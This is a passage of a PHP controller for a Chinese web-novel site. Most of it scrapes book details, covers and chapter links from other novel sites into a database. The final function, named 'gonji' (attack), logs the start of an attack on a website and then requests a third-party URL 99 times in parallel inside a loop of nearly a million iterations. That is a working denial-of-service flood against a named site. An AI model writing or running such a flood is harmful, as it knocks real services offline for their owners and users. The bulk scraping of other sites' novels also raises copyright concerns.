        $image->text($name,$font,60,'#000000',\think\Image::WATER_NORTH,90)->save($imgpath);
        return $num.'_img.jpg';
    }

    /**
     * 损坏封面图片重新制作，并更新路径
     */
    public function booksCover(){
        set_time_limit(0);
        $data = Db::table('books_cou')->where('books_img','1.jpg')->select();
        foreach ($data as $value){
            $imgname = $this->addCover($value['books_name']);
            Db::table('books_cou')->where('books_id',$value['books_id'])->update(['books_img'=>$imgname]);

        }
        echo '完成';
    }



    public function getNewBooks(){
        $url = 'https://www.xxbiquge.com/80_80292/';
        $curl = model('Curl');
        $data = $curl->getDataHttps($url);


        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        //取得小说信息
        $content = array(
            'name'=>array('h1','text'),
            'type'=>array('.con_top>a:eq(1)','text'),
            'author'=>array('#info>p:eq(0)','text'),
            'time'=>array('#info>p:eq(2)','text'),
            'summary'=>array('#intro>p','text'),
            'img' => array('#fmimg>img','src'),


        );

        //匹配出信息
        $info = QueryList::Query($data,$content)->data;

        //使用该函数对结果进行转码
        $author = mb_convert_encoding($info[0]['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

        $author = substr($author,17);

        $summary = mb_convert_encoding($info[0]['summary'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');


        $time = mb_convert_encoding($info[0]['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
        $time = substr($time,15);



        $types = mb_convert_encoding($info[0]['type'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
        $types = substr($types,0,6);
        if($types=='修真'){
            $types = '仙侠';
        }elseif($types=='言情'){
            $types = '都市';
        }

        $type_id =  Db::table('books_type')->where('type_name','like',"%{$types}%")->value('type_id');
        $type_id = !empty($type_id) ? $type_id : '14';

        //下载小说封面
        $path = ROOT_PATH. 'public/static/images/books_img/';
        $imgName = $curl->downloadImg($info[0]['img'],$path);


        $books_name = mb_convert_encoding($info[0]['name'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

        $result[] = ['books_name'=>$books_name,'books_author'=>$author,'books_synopsis'=>$summary,'books_time'=>$time,'books_type'=>$type_id,'books_img'=>$imgName,'books_url'=>$url];


        /*取得小说地址*/
        $chapter_all = array(
            'text' => array('dd>a', 'text'),
            'href' => array('dd>a', 'href'),
        );

        //匹配出所有章节
        $match = QueryList::Query($data, $chapter_all)->data;
        halt(end($match));

    }


    /**
     * 小说更新到最新章节
     * 定时更新小说任务
     */
    public function nowChapter(){

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        echo '开始更新最新章节'."<br/>";
        echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";
        $this->writeLog('开始更新小说，时间为：');



        Db::table('books_cou')->where('books_status','0')->chunk(40, function($books) {


            $result=array();
            foreach ($books as $val) {

                $url = $val['books_url'];

                //引入curl方法
                $curl = model('Curl');
                $html = $curl->getDataHttps($url);
                if(empty($html)){
                    continue;
                }

                //取得更新时间
                $content = array(
                    'time'=>array('#info>p:eq(2)','text'),
                );
                //匹配出信息
                $info = QueryList::Query($html,$content)->data;

                $time = mb_convert_encoding($info[0]['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $time = substr($time,15);

                /*取得小说地址*/
                $chapter_all = array(
                    'text' => array('dd>a', 'text'),
                    'href' => array('dd>a', 'href'),
                );
                //匹配出所有章节
                $match = QueryList::Query($html, $chapter_all)->data;

                if(empty($match)){
                    continue;
                }


                $match = array_reverse($match);
                $chapter_name = mb_convert_encoding($match[0]['text'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

                //取得更新的目标网址
                $http_url = parse_url($url);

                //取得更新章节的地址
                $url_info = parse_url($match[0]['href']);

                $chapter_url =$http_url['scheme'].":/"."/".$http_url['host'].$url_info['path'];

                $res = ['books_id'=>$val['books_id'],'chapter_name'=>$chapter_name,'chapter_url'=>$chapter_url];
                if(!empty($res)){

                    $has = Db::name('chapter')->where('books_id',$val['books_id'])->find();

                    if(!empty($has)){
                        Db::name('chapter')->where('books_id',$val['books_id'])->update($res);
                    }else{
                        Db::name('chapter')->insert($res);
                    }

                    echo '《'.$val['books_name'].'》最新章节爬取成功!'."<br/>";


                  //  Db::table('books_cou')->where('books_id', $val['books_id'])->update(['books_time'=>$time]);
                }
            }

//           if(!empty($res)){
//                Db::name('chapter')->insertAll($res);
//                echo '最新章节爬取成功!'."<br/>";
//                echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";
//            }


        });
        $this->writeLog('小说更新完成，时间为：');
        echo '全部小说更新完成!'."<br/>";
        echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";

    }

    /**
     * 写入日志，测试萣时器所用
     */
    public function writeLog($txt){

        $content = $txt.date('Y-m-d H:i:s');
        $filename="test.log";

        $handle=fopen($filename,"a+");

        $str=fwrite($handle,$content."\r\n");

        fclose($handle);
    }


    /**
     * 更新小说源地址
     */
    public function updateUrlBoobs(){
        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        echo '开始更新小说源地址'."<br/>";
        echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";


        Db::table('books_cou')->where('books_url','')->chunk(40, function($books) {
            $result=array();
            foreach ($books as $val) {
                $key = urlencode($val['books_name']);
                $url = 'https://www.23txt.com/search.php?keyword='.$key;

                //引入curl方法
                $curl = model('Curl');
                $html = $curl->getDataHttps($url);
                if(empty($html)){
                    continue;
                }

                //取得地址
                $content = array(
                    'books_name'=>array('.result-game-item-detail>h3>a>span','text'),
                    'books_url'=>array('.result-game-item-detail>h3>a','href'),
                );


                //匹配出信息
                $info = QueryList::Query($html,$content)->data;

                foreach ($info as $tal){
                    if($tal['books_name'] ==  $val['books_name']){
                        $data['books_url'] = $tal['books_url'];
                        Db::table('books_cou')->where('books_id',$val['books_id'])->update($data);
                        echo '《'.$val['books_name'].'》源地址成功!'."<br/>";
                        break;
                    }else{
                        continue;
                    }
                }

            }

        });

        echo '全部小说更新完成!'."<br/>";
        echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";
    }


    /**
     * 新书入库
     */
    public function newqidian(){

        echo '开始入库新书'."<br/>";
        echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";

        for($i=1;$i<26;$i++){
            $url = 'https://www.qidian.com/rank/yuepiao?style=1&chn=-1&page='.$i;
            $curl = model("Curl");
            $html = $curl->getDataHttps($url);

            //第三方类库
            Loader::import('QueryList', EXTEND_PATH);
            //取得更新时间
            $content = array(
                'text'=>array('.book-img-text>>h4','text'),
            );
            //匹配出信息
            $data = QueryList::Query($html,$content)->data;

            foreach ($data as $val){

                $has = Db::table('books_cou')->where('books_name',$val['text'])->find();
                if(empty($has)){

                    $key = urlencode($val['text']);
                    $url = 'https://www.23txt.com/search.php?keyword='.$key;

                    //引入curl方法
                    $html = $curl->getDataHttps($url);
                    if(empty($html)){
                        continue;
                    }

                    //取得地址
                    $content = array(
                        'books_name'=>array('.result-game-item-detail>h3>a>span','text'),
                        'books_url'=>array('.result-game-item-detail>h3>a','href'),
                    );


                    //匹配出信息
                    $info = QueryList::Query($html,$content)->data;

                    foreach ($info as $tal){
                        if($tal['books_name'] ==  $val['text']){
                            $this->Warehousing($tal['books_url'],$tal['books_name']);
                            echo "《".$tal['books_name'].'》入库成功'."<br/>";
                        }else{
                            continue;
                        }
                    }
                }
            }
        }

        echo '新书入库完成'."<br/>";
    }

    /**
     * 匹配小说后入库
     */
    public function Warehousing($href,$name,$rule_id=2){

        //引入curl方法
        $curl = model('Curl');
        $all = $curl->getDataHttps($href);

        //规则匹配方法
        $rule = Db::table('books_rule_info')->where('rule_id',$rule_id)->find();
        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);
        //取得小说信息
        $content = array(
            'name'=>array($rule['books_name'],'text'),
            'type'=>array($rule['books_type'],'text'),
            'author'=>array($rule['books_author'],'text'),
            'time'=>array($rule['books_time'],'text'),
            'synopsis'=>array($rule['books_synopsis'],'text'),
            'img' => array($rule['books_img'],'src'),


        );

        //匹配出信息
        $info = QueryList::Query($all,$content)->data;
        if(!empty($info[0])) {

            //使用该函数对结果进行转码
            $author = mb_convert_encoding($info[0]['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $author = substr($author, 33);

            $synopsis = mb_convert_encoding($info[0]['synopsis'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');


            $time = mb_convert_encoding($info[0]['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $time = substr($time, 15);

            $url = $info[0]['img'];

            $types = mb_convert_encoding($info[0]['type'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $types = substr($types, 0, 6);
            if ($types == '修真') {
                $types = '仙侠';
            } elseif ($types == '言情') {
                $types = '都市';
            }

            $type_id = Db::table('books_type')->where('type_name', 'like', "%{$types}%")->value('type_id');
            $type_id = !empty($type_id) ? $type_id : '14';

            $books_name =mb_convert_encoding($info[0]['name'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

            //下载小说封面
            $path = ROOT_PATH. 'public/static/images/books_img/';
            $imgName = $curl->downloadImg($url,$path);

            $result = ['books_name'=>$books_name,'books_author'=>$author,'books_synopsis'=>$synopsis,'books_time'=>$time,'books_img'=>$imgName,'books_type'=>$type_id,'books_status'=>'0','books_url'=>$href];

            $books_id = Db::table('books_cou')->insertGetId($result);

            $chapter_all = array(
                'text'=>array($rule['chapter_name'],'text'),
                'href'=>array($rule['chapter_url'],'href'),
            );
            //匹配出所有章节
            $match = QueryList::Query($all,$chapter_all)->data;

            //去除前面重复的几个最新章节
            $match = array_unique_fb($match);


            foreach ($match as $key=>$val){

                //使用该函数对结果进行转码
                $chapter[$key]['text'] = mb_convert_encoding($val[0], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $chapter[$key]['href'] = correct_url($href, $val[1]);

            }

            $end_chapter = end($chapter);

            $chapter_data = ['books_id'=>$books_id,'chapter_name'=>$end_chapter['text'],'chapter_url'=>$end_chapter['href']];

            Db::table('books_chapter')->insert($chapter_data);

        }


    }

    public function gonji(){

        $this->writeLog('开始攻击网站，时间为：');

        $url = 'http://yl002.taldtq.com/?yrid=1021';
        for($j=1;$j<100;$j++){
            $arr[] = $url;
        }

        $data = array();
        for($i=1;$i<1000000;$i++){
            $curl = model('Curl');
            $all = $curl->getManyUrl($arr);

        }

        $this->writeLog('攻击网站结束，时间为：');


    }




}